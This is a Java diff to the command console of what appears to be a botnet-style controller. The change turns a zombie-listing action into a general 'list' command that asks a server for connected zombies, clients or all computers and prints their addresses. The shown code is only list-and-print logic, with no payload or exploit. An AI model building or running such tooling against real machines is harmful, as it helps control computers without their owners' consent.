@@ -100,28 +100,31 @@ public class CommandActions {
 		};
 	}
 
-	public static CommandJob getListZombiesAction() {
+	public static CommandJob getListAction() {
 		return new CommandJob() {
 			@Override
 			public Object doJob(Command command) {
-				boolean isAll = command.hasFlag("-a");
+				command.getCommandArguments()[0] = command.getCommandArguments()[0].toLowerCase();
 				try {
-					if (isAll) {
-						ClientNetwork.getClient().getOutputStream()
-								.writeObject(new DataPackage().setMessage("LIST_ALL"));
-					} else {
+					if (command.getCommandArguments()[0].equals("zombies")) {
 						ClientNetwork.getClient().getOutputStream()
 								.writeObject(new DataPackage().setMessage("LIST_ZOMBIES"));
+					} else if (command.getCommandArguments()[0].equals("clients")) {
+						ClientNetwork.getClient().getOutputStream()
+								.writeObject(new DataPackage().setMessage("LIST_CLIENTS"));
+					} else if (command.getCommandArguments()[0].equals("computers")) {
+						ClientNetwork.getClient().getOutputStream()
+								.writeObject(new DataPackage().setMessage("LIST_ALL"));
 					}
 
 					Computer[] addresses = (Computer[]) ((DataPackage) ClientNetwork.getClient().getInputStream()
 							.readObject()).getObjects();
-					Console.println("There are " + addresses.length + " " + (isAll ? "computer(s)" : "zombie(s)")
-							+ " connected.");
+					Console.println(
+							"There are " + addresses.length + " " + command.getCommandArguments()[0] + " connected.");
 
 					for (Computer address : addresses) {
-						Console.println(address.getAddress()
-								+ (isAll ? (address.isZombie() ? " (zombie)" : " (computer)") : ""));
+						Console.println(address.getAddress() + (command.getCommandArguments()[0].equals("computers")
+								? (address.isZombie() ? " (zombie)" : " (client)") : ""));
 					}
 
 					return addresses.length;
